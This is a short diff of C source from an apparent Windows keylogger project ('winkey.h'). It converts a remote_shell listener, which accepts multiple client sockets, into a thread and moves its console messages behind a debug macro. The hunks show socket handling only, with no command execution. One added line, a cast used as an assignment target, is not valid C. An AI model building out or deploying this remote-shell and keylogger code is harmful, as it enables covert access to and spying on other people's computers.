@@ -1,4 +1,4 @@
-#include "winkey.h"
+#include <winkey.h>
 
 char    *CommandCpy(char *recvbuf)
 {
@@ -56,11 +56,13 @@ int  init_socket(SOCKET *ListenSocket)
     return (iResult);
 }
 
-int remote_shell(void) 
+DWORD WINAPI remote_shell(void* args) 
 {
     WSADATA wsaData;
     SOCKET  ListenSocket = INVALID_SOCKET;
     SOCKET  clients[MAX_CLIENTS];
+
+    (void*)args = NULL;
 
     int     i = 0;
     int     iResult = 0;
@@ -75,7 +77,7 @@ int remote_shell(void)
     iResult = init_socket(&ListenSocket);
     if (iResult == -10)
         return (1);
-
+    DBG("SOCKET: %i\n", iResult);
     for (i = 0; i < MAX_CLIENTS; i++)
         clients[i] = INVALID_SOCKET;
 
@@ -107,7 +109,7 @@ int remote_shell(void)
                         if (clients[i] == INVALID_SOCKET)
                         {
                             clients[i] = newSocket;
-                            printf("New client: %d\n", newSocket);
+                            DBG("New client: %d\n", newSocket);
                             break ;
                         }
                     }
@@ -125,7 +127,7 @@ int remote_shell(void)
 
                 if (ret <= 0)
                 {
-                    printf("Client disconnected\n");
+                    DBG("Client disconnected\n");
                     closesocket(s);
                     clients[i] = INVALID_SOCKET;
                     continue;
